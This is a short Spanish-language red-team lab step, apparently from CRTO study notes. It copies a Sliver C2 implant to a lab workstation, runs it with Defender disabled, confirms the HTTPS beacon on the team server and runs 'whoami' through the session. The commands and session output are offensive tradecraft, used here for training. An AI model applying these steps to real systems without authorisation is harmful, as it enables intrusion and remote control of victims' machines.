# Fase-04 · Payload Execution & Beacon Acquisition

> Bloque CRTO: Ejecución e implantación  
> Concepto: Ejecutar payload en WKSTN-01, obtener beacon


> **Paso 4 de 6 · Secuencia de construcción**
>
> **Objetivo del paso:** Ejecutar el payload y adquirir la primera baliza en el objetivo.
>
> **Prerequisito:** Paso 3 (payload generado).
>
> **Habilita:** operar la baliza (Paso 5).

---

## 🎯 Objetivo

Ejecutar el payload en WKSTN-01, obtener una sesión de beacon activa, verificar conexión.

## 📋 Prerequisitos

- Payload staged o stageless listos (Fase 03)
- WKSTN-01 accesible
- Listener HTTPS activo (Fase 02)
- Defender deshabilitado temporalmente

## 🔨 Ejecución

### Paso 1: Transferir payload a WKSTN-01

```bash
scp /tmp/sliver_XXXXXXX_windows_amd64.exe user@wkstn-01:C:\\Temp\\
```

**Captura:** `FASE-04/fase-04-01-payload-transferido.png`

### Paso 2: Ejecutar payload en WKSTN-01

```powershell
C:\Temp\sliver_XXXXXXX_windows_amd64.exe
```

**Esperado:** Ejecución silenciosa (sin output)

**Captura:** `FASE-04/fase-04-02-payload-ejecutado.png`

### Paso 3: Verificar beacon en team server

```bash
sliver > sessions
```

**Esperado:**
```
[*] Active Sessions:
  ID  Name           Transport  Remote Address  Hostname     OS       User      Arch
  --  ----           ---------  --------------  --------     --       ----      ----
  1   RAPID_JAGUAR   https      10.0.2.12:443   WKSTN-01     windows  sapod     amd64
```

**Captura:** `FASE-04/fase-04-03-beacon-conectado.png`

### Paso 4: Interactuar con beacon

```bash
sliver > use 1
sliver > shell whoami
```

**Captura:** `FASE-04/fase-04-04-comando-whoami.png`

## 🏁 Resultado

✅ Payload ejecutado en WKSTN-01  
✅ Beacon conectado y activo  
✅ Sesión respondiendo comandos  
✅ C2 operativo